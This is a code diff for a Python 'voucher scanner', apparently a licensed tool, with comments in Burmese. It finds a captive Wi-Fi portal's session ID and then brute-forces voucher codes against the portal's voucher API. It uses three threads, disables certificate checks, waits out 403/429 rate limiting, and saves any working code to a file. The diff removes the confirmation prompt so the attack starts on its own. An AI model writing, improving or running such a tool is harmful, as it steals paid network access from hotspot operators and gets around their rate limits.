@@ -8,7 +8,6 @@ import time
 import threading
 import random
 import os
-import sys
 import hashlib
 from urllib.parse import urlparse, parse_qs
 
@@ -36,7 +35,7 @@ def get_device_key():
 def check_license():
     my_key = get_device_key()
     print(f"{MAGENTA}╔══════════════════════════════════════════════════╗")
-    print(f"║        MOE YU ULTIMATE VOUCHER SCANNER v3        ║")
+    print(f"║      MOE YU AUTO VOUCHER SCANNER v3.1 FIXED      ║")
     print(f"╚══════════════════════════════════════════════════╝{RESET}")
     print(f"{WHITE}[*] Device Key: {GREEN}{my_key}{RESET}")
     try:
@@ -62,64 +61,66 @@ def attempt_voucher(api_url, sid, thread_id):
         try:
             r = requests.post(api_url, json=payload, timeout=5, verify=False)
             if r.status_code == 200:
-                if r.json().get('success'):
+                result = r.json()
+                if result.get('success'):
                     FOUND_EVENT.set()
                     print(f"\n\n{GREEN}[++++++++++] VOUCHER FOUND: {test_code} [++++++++++]{RESET}")
+                    # မှတ်သားထားရန်
+                    with open("found_vouchers.txt", "a") as f:
+                        f.write(f"Code: {test_code} | SID: {sid}\n")
                     break
                 print(f"{WHITE}Thread-{thread_id} | Testing: {YELLOW}{test_code}{WHITE} | Status: {RED}Invalid{RESET}", end="\r")
             elif r.status_code in [403, 429]:
                 time.sleep(20)
-        except: pass
+        except:
+            pass
         time.sleep(0.05)
 
 def start_scanner(portal_url, sid):
     parsed = urlparse(portal_url)
     api_url = f"{parsed.scheme}://{parsed.netloc}/api/auth/voucher/"
+    
     print(f"\n{CYAN}[*] Target API: {api_url}{RESET}")
-    for i in range(3):
-        threading.Thread(target=attempt_voucher, args=(api_url, sid, i+1), daemon=True).start()
-    while not FOUND_EVENT.is_set(): time.sleep(1)
+    print(f"{GREEN}[✓] Starting Scan Automatically...{RESET}\n")
+
+    # Thread ၃ ခုဖြင့် အလုပ်လုပ်ခိုင်းခြင်း
+    for i in range(1, 4):
+        t = threading.Thread(target=attempt_voucher, args=(api_url, sid, i))
+        t.daemon = True
+        t.start()
+
+    while not FOUND_EVENT.is_set():
+        time.sleep(1)
 
 # ===============================
 # MAIN PROCESS
 # ===============================
 def main():
     if not check_license(): return
-    print(f"\n{CYAN}[*] Waiting for Portal (Please open http://1.1.1.1 in Browser)...{RESET}")
     
+    print(f"\n{CYAN}[*] Waiting for Portal (Please open Browser)...{RESET}")
     while True:
         try:
-            # 1.1.1.1 ကိုသုံးပြီး Portal ကို ပိုမိုမြန်ဆန်စွာ ရှာဖွေခြင်း
             r = requests.get("http://1.1.1.1", allow_redirects=True, timeout=5)
+            portal_url = r.url
             
-            if "1.1.1.1" not in r.url:
-                portal_url = r.url
+            # URL ထဲမှာ SID မပါရင် Manual ထည့်ခိုင်းမယ်
+            if "sessionId=" not in portal_url:
+                portal_url = input(f"{YELLOW}[!] SID မတွေ့ပါ။ Browser URL ကို ဒီမှာ ကူးထည့်ပါ: {RESET}").strip()
+            
+            if "sessionId=" in portal_url:
                 sid = parse_qs(urlparse(portal_url).query).get('sessionId', [None])[0]
-                
-                # အကယ်၍ URL ထဲမှာ SID မပါရင် Page content ထဲမှာ ရှာမယ်
-                if not sid:
-                    r_text = requests.get(portal_url, verify=False).text
-                    sid_match = re.search(r'sessionId\s*[:=]\s*["\']([^"\']+)["\']', r_text)
-                    if sid_match: sid = sid_match.group(1)
-
                 if sid:
-                    print(f"{GREEN}[✓] Portal Detected: {portal_url}{RESET}")
-                    print(f"{GREEN}[✓] Session ID: {sid}{RESET}")
-                    if input(f"\n{YELLOW}Voucher Scan စတင်မလား? (y/n): {RESET}").lower() == 'y':
-                        start_scanner(portal_url, sid)
-                        break
-                else:
-                    # အလိုအလျောက် ရှာမတွေ့ရင် လက်နဲ့ထည့်ခိုင်းတဲ့စနစ်
-                    print(f"{RED}[!] Session ID Not Found အလိုအလျောက်ရှာမရပါ{RESET}")
-                    manual_url = input(f"{CYAN}[*] Browser URL ကို ဒီမှာ Copy ကူးထည့်ပေးပါ: {RESET}").strip()
-                    if "sessionId=" in manual_url:
-                        sid = parse_qs(urlparse(manual_url).query).get('sessionId', [None])[0]
-                        if sid:
-                            start_scanner(manual_url, sid)
-                            break
+                    print(f"{GREEN}[✓] Portal & SID Detected!{RESET}")
+                    # y/n မမေးတော့ဘဲ တန်းစတင်ပါပြီ
+                    start_scanner(portal_url, sid)
+                    break
+            
             time.sleep(3)
-        except KeyboardInterrupt: break
-        except: time.sleep(2)
+        except KeyboardInterrupt:
+            break
+        except:
+            time.sleep(2)
 
 if __name__ == "__main__":
     main()
